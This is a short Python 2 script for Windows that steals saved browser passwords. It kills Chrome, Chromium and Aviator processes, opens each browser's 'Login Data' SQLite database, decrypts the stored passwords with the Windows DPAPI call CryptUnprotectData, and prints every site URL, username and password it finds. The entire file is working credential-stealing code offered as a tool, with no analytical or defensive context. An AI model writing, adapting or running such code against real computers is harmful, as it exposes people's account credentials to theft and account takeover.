#!/usr/bin/env python
from os import getenv, sep, popen
import sqlite3
import win32crypt

try:
	popen('taskkill /f /im chrome.exe')
except:
	pass

try:
	popen('taskkill /f /im chromium.exe')
except:
	pass

try:
	popen('taskkill /f /im aviator.exe')
except:
	pass

appdata = getenv("APPDATA")
paths = []
paths.append(appdata + "%s..%sLocal%sGoogle%sChrome%sUser Data%sDefault%sLogin Data" % (sep,sep,sep,sep,sep,sep,sep))  # Chrome
paths.append(appdata + "%s..%sLocal%sChromium%sUser Data%sDefault%sLogin Data" % (sep,sep,sep,sep,sep,sep))            # Chromium
paths.append(appdata + "%s..%sLocal%sAviator%sUser Data%sDefault%sLogin Data" % (sep,sep,sep,sep,sep,sep))             # Aviator

for passpath in paths:
	sendpass = ''
	try:
		connection = sqlite3.connect(passpath)
		cursor = connection.cursor()
		cursor.execute('SELECT origin_url, action_url, username_value, password_value FROM logins')
		for information in cursor.fetchall():
			passw = win32crypt.CryptUnprotectData(information[3], None, None, None, 0)[1]
			if passw:
				sendpass += ' [*] Website-origin: ' + information[0]
				sendpass += '\n [*] Website-action: ' + information[1]
				sendpass += '\n [*] Username: ' + information[2]
				sendpass += '\n [*] Password: ' + passw + '\n'
		if sendpass:
			print '\n [*] Passwords found for %s:\n' % (passpath)
			print sendpass
		else:
			print ' [X] No passwords found in %s' % (passpath)
	except:
		print ' [X] No database found at %s' % (passpath)
